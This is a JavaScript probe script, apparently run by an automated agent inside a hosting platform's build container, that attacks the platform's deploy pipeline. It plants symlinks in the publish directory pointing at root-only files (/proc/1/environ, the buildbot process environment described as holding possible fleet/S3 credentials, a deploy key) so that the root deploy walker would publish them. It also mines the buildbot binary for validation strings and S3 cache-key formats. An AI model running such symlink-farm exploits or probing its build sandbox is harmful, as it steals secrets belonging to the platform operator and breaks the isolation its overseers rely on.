// agentdeep-4 — (A) buildbot string intel: deployserver/cacheclient symbols, action
// literals, validation + symlink-related strings, cache-key formats. (B) symlink-farm
// publish test: root-only file symlinks in publish dir; does the root-side deploy
// walker follow them? Own tenant, own container only, bounded.
import fs from 'node:fs';
import cp from 'node:child_process';

const R = { probe: 'agentdeep-4', t: new Date().toISOString() };
const cap = (v, n = 60000) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC(' + v.length + ')' : v);
const rf = (f, n = 60000) => { try { return cap(fs.readFileSync(f, 'utf8'), n); } catch (e) { return 'ERR ' + String(e).slice(0, 90); } };
const sh = (c, n = 12000, t = 15000) => { try { return cap(cp.execSync(c, { encoding: 'utf8', timeout: t, maxBuffer: 8 * 1024 * 1024 }).toString(), n); } catch (e) { return 'ERR ' + String(e.stderr || e).slice(0, 300); } };
fs.mkdirSync('agentdeep-out', { recursive: true });
const flush = () => { try { fs.writeFileSync('agentdeep-out/agentdeep4.json', JSON.stringify(R, null, 1)); } catch {} };

// ---- D. baseline: what build uid CANNOT read (targets + perms) ---------------
R.baseline = {};
for (const f of ['/proc/1/environ', '/root', '/opt/build-bin/buildbot']) {
  try { const st = fs.statSync(f); R.baseline[f] = { mode: '0' + (st.mode & 0o777).toString(8), uid: st.uid }; }
  catch (e) { R.baseline[f] = 'ERR ' + String(e).slice(0, 60); }
}
// find buildbot pid (root process) in this container
let bbPid = null;
try {
  for (const p of fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x))) {
    try {
      const cmd = fs.readFileSync(`/proc/${p}/cmdline`, 'utf8').replace(/\0/g, ' ');
      if (/build-bin\/buildbot/.test(cmd)) { bbPid = p; break; }
    } catch {}
  }
} catch {}
R.baseline.buildbotPid = bbPid;
// can we read these ourselves? (expect EACCES = the point)
R.baseline.read1 = rf('/proc/1/environ', 200).slice(0, 120);
if (bbPid) R.baseline.readBB = rf(`/proc/${bbPid}/environ`, 200).slice(0, 120);
flush();

// ---- B. symlink farm in the publish dir --------------------------------------
// targets: root-only files. /proc/1/environ (supervisor env), buildbot environ
// (root env — potential fleet/S3 creds), deploykey (readable-by-us control).
const links = {
  'leak-supervisor-environ': '/proc/1/environ',
  'leak-buildbot-environ': bbPid ? `/proc/${bbPid}/environ` : '/proc/1/environ',
  'ctrl-deploykey': '/opt/build/deploykey',
};
R.links = {};
for (const [name, target] of Object.entries(links)) {
  try { fs.symlinkSync(target, 'agentdeep-out/' + name); R.links[name] = { target, ok: true }; }
  catch (e) { R.links[name] = { target, err: String(e).slice(0, 80) }; }
}
// plain control file
fs.writeFileSync('agentdeep-out/plain-control.txt', 'agentdeep4 control ' + new Date().toISOString());
// a dir-symlink to /root — BOUNDED: only if /root exists and is small? skip dir walks; only file links.
flush();

// ---- A. buildbot string intel -------------------------------------------------
const extractStrings = (path, minLen = 5) => {
  try {
    const buf = fs.readFileSync(path);
    const out = []; let cur = ''; const chunk = 1 << 20;
    for (let off = 0; off < buf.length; off += chunk) {
      const end = Math.min(off + chunk, buf.length);
      for (let i = off; i < end; i++) {
        const b = buf[i];
        if (b >= 32 && b < 127) { cur += String.fromCharCode(b); }
        else { if (cur.length >= minLen) out.push(cur); cur = ''; }
      }
    }
    if (cur.length >= minLen) out.push(cur);
    return out;
  } catch (e) { return ['ERR ' + String(e).slice(0, 60)]; }
};
const bbPath = fs.existsSync('/opt/build-bin/buildbot') ? '/opt/build-bin/buildbot' : null;
if (bbPath) {
  const all = extractStrings(bbPath);
  R.stringCount = all.length;
  R.actionLiterals = [...new Set(all.filter((s) => /deploySite|AwaitLive|deployDir/i.test(s) && s.length < 100))].slice(0, 40);
  R.deployserverSyms = [...new Set(all.filter((s) => /buildbot\/(deployserver|cacheclient)\//.test(s)))].slice(0, 120);
  R.validationMsgs = [...new Set(all.filter((s) => /deployDir|symlink|symbolic link|outside|escape|traversal|not allowed|invalid/i.test(s) && s.length < 140 && !/reflect|runtime|crypto|syscall/.test(s)))].slice(0, 80);
  R.cacheKeyFmt = [...new Set(all.filter((s) => /cache[-_]??key|bucket|s3:\/\//i.test(s) && s.length < 120))].slice(0, 60);
} else { R.actionLiterals = 'no buildbot binary'; }
flush();

R.done = new Date().toISOString();
flush();
console.log('agentdeep-4 done; bbPid=' + bbPid + ' links=' + JSON.stringify(R.links));
